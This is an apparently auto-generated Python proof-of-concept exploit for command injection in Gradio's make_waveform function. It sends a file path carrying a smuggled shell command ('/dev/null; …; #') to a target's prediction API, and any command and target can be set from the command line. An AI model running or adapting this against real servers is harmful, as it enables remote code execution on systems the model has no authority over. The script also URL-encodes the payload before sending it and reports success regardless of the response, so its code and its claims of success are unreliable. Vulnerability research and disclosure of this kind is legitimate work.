#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: rce-008
# Sink: make_waveform
# Auto-generated — run with: python3 rce_use_shell_true_subprocess_make_waveform.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in gradio_src's make_waveform function.
The vulnerability exists because the `audio` parameter (file path) is directly
interpolated into an ffmpeg command string that is executed with shell=True.
An attacker can inject shell metacharacters to execute arbitrary commands.
"""

import sys
import time
import requests
import urllib.parse

# ===== CONFIGURATION =====
TARGET_URL = "http://localhost:7860"  # Change this to the target Gradio app URL
PAYLOAD_CMD = "touch /tmp/poc_success.txt"  # Benign payload to demonstrate RCE
# =========================

def exploit(target_url, payload_cmd):
    """
    Exploit the command injection in make_waveform by sending a malicious
    audio file path containing shell metacharacters.
    
    The injection point is in the ffmpeg command construction:
    ffmpeg_cmd = f"""ffmpeg -loop 1 -i {tmp_img.name} -i {audio_file} ..."""
    
    We inject via the audio_file parameter which is user-controlled when
    audio is provided as a string (file path).
    """
    
    # Construct the malicious audio file path
    # We use a semicolon to terminate the ffmpeg command and execute our payload
    # The payload will be executed before ffmpeg processes the invalid file
    malicious_path = f"/dev/null; {payload_cmd}; #"
    
    # URL encode the path to ensure it's properly transmitted
    encoded_path = urllib.parse.quote(malicious_path, safe='')
    
    # The Gradio API endpoint for the waveform function
    # This assumes the default Gradio API structure
    api_url = f"{target_url}/api/predict/"
    
    # Prepare the request payload
    # The 'data' field contains the parameters for the make_waveform function
    # We provide the malicious path as the audio parameter
    request_data = {
        "data": [
            encoded_path,  # audio parameter (file path)
            "#000000",     # bg_color
            None,          # bg_image
            0.5,           # fg_alpha
            "#FFFFFF",     # bars_color
            50,            # bar_count
            0.5            # bar_width
        ]
    }
    
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Payload command: {payload_cmd}")
    print(f"[*] Malicious audio path: {malicious_path}")
    print()
    
    try:
        # Send the exploit request
        print("[*] Sending exploit request...")
        response = requests.post(
            api_url,
            json=request_data,
            timeout=30,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status code: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}...")
        
        # Check if the payload was executed
        # For the benign payload, we check if the file was created
        # In a real scenario, you'd use a different verification method
        print()
        print("[*] Checking if payload executed...")
        print(f"[*] If successful, file /tmp/poc_success.txt should exist")
        print(f"[*] You can verify by running: ls -la /tmp/poc_success.txt")
        
        return True
        
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not connect to {target_url}")
        print("[-] Make sure the target Gradio app is running")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False

def main():
    """
    Main function to run the exploit.
    """
    print("=" * 60)
    print("Gradio make_waveform RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    # Use command-line arguments if provided
    import argparse
    parser = argparse.ArgumentParser(
        description="Exploit RCE in Gradio's make_waveform function"
    )
    parser.add_argument(
        "-t", "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "-c", "--command",
        default=PAYLOAD_CMD,
        help=f"Command to execute (default: {PAYLOAD_CMD})"
    )
    args = parser.parse_args()
    
    # Run the exploit
    success = exploit(args.target, args.command)
    
    if success:
        print()
        print("[+] Exploit completed successfully")
        print("[+] The payload command should have been executed on the target")
    else:
        print()
        print("[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
